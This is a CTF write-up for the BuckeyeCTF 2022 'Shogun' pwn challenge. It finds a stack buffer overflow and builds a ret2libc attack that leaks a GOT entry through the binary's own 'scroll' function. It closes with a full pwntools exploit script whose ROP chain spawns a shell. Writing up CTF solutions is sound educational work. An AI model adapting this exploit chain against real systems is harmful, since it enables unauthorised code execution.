* TOC
{:toc}

# Notice

This is currently just a hack note - aka, then notes I took on the challenge when I was playing. It will be flushed out into a full fleged writeup / walkthrough in the near future :)

This is a writeup about the 2022 BuckeyeCTF challenge `Shogun`

# BuckeyeCTF 2022 Shogun | Thomas Spencer

> Category: `pwn` | Difficulty: `medium`

> [Download original binary](/assets/binaries/shogun) `sha256sum: 30b8e78e8036bddb1b8314654a2b8c4e7056a64dff390cba40ddf14c2ded807e`

> [Download original source code](/assets/binaries/shogunOrigninal.c)

# Recon

## File

```
shogun: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0c6ef59275fd0386ecdccf02d6838d327ed11b61, for GNU/Linux 3.2.0, not stripped
```

## Checksec 

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and no Canary means we'll likely have to ROP, perhaps ret2libc

# Functions

## scroll

* Will take a `char\*` as input.

* Will slowly print out the inputted string, one character at a time

## Encounter

* Prints out a string of story flavor text

* Takes user input

    * Obvious buffer overflow, size 32 buffer with size 81 read using `fgets()`

## main

* Prints some story text

* Takes in user input

    * Checks to see if start of user input is `"Look around."`

    * If it is not, we die

    * If it is, we enter `encounter`


# Vulnerabilites

* Buffer overflow in `encounter` function

    * Large enough to allow for ROP

* No canaries or PIE, meaning we can ROP without stack data leaks

# Plan of Attack

* `ret2libc` attack, because we have an easy stack overflow into ROP vector.

**ISSUE**: Normally for `ret2libc` ROP, we would use a `Puts(Puts)` to leak a GOT table entry to find out where `libc` is. However, there is no `puts` reference in the GOT of the binary.

Must use another means to leak information...

We can use the `scroll` function, since it acts like puts!

# Exploit

* ... enter `encounter` function

* ROP to leak a GOT entry with the `scroll` function

* Use the leak to perform a `ret2libc` and grab a shell

# Final Script

```python
#!/bin/env python3

from pwn import *

DEBUG = True
FILE = "./shogun"
HOST = "pwn.chall.pwnoh.io"
PORT = 13373

POP_RDI_RET = 0x401383
RET = 0x40101a
PUTCHAR_GOT = 0x403FC0
BINSH = 0x1b45bd

context.arch = "amd64"
context.encoding = "latin"
warnings.simplefilter("ignore")

elf = ELF(FILE)
rop = ROP(FILE)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process([FILE]) if (DEBUG) else remote(HOST, PORT)

BUFFER_SIZE = 0x20

print(p.recvuntil(b'disturbance. ').decode())
p.sendline(b'Look around.')
print(p.recvuntil(b'He attacks you! ').decode())

payload = b'A'*BUFFER_SIZE
payload += b'B'*8
payload += p64(RET)
payload += p64(POP_RDI_RET)
payload += p64(PUTCHAR_GOT)
payload += p64(elf.symbols["scroll"])
payload += p64(elf.symbols["_start"])

assert len(payload) < 0x51
for byte in list(payload):
    assert byte != 0x0a, f"Failed"

p.send(payload)

putCharPtr = p.recvuntil(b'You finally')[:6]
print(putCharPtr.hex())
putCharInt = int.from_bytes(putCharPtr, "little", signed=False)

libcBase = putCharInt - 0x86280

print(hex(putCharInt))

p.sendline(b'Look around.')
print(p.recvuntil(b'disturbance. ').decode())
print(p.clean().decode())
print(p.recvuntil(b'He attacks you! ').decode())

payload = b'A'*BUFFER_SIZE
payload += b'B'*8
payload += p64(RET)
payload += p64(POP_RDI_RET)
payload += p64(libcBase + BINSH)
payload += p64(libcBase + libc.symbols["system"])

assert len(payload) < 0x51
for byte in list(payload):
    assert byte != 0x0a, f"Failed"

p.sendline(payload)

p.interactive()

p.close()
```

